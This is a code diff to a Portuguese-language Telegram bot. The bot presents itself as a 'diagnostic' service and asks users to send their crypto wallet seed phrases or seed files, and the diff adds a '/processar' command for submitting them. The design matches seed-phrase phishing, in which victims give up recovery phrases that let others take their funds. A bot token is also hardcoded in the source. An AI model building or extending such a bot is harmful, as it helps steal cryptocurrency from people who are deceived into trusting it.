@@ -16,7 +16,11 @@ TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8785377732:AAGEOY6H0Bo_mgv
 extractor = SeedExtractor()
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    await update.message.reply_text("🤖 **Bot de Diagnóstico Ativado**\n\nEnvie uma seed ou arquivo .txt. Eu vou te mostrar os endereços que estou gerando para você conferir com sua carteira.")
+    await update.message.reply_text("🤖 **Bot de Diagnóstico Ativado**\n\nEnvie uma seed ou arquivo .txt. Eu vou te mostrar os endereços que estou gerando para você conferir com sua carteira.\n\nComandos:\n/start - Inicia o bot\n/processar - Processa uma seed ou arquivo")
+
+async def processar(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Comando /processar para iniciar processamento"""
+    await update.message.reply_text("📝 Envie uma seed ou arquivo .txt para processar.")
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     text = update.message.text
@@ -67,6 +71,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 def main():
     app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("processar", processar))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     app.run_polling()
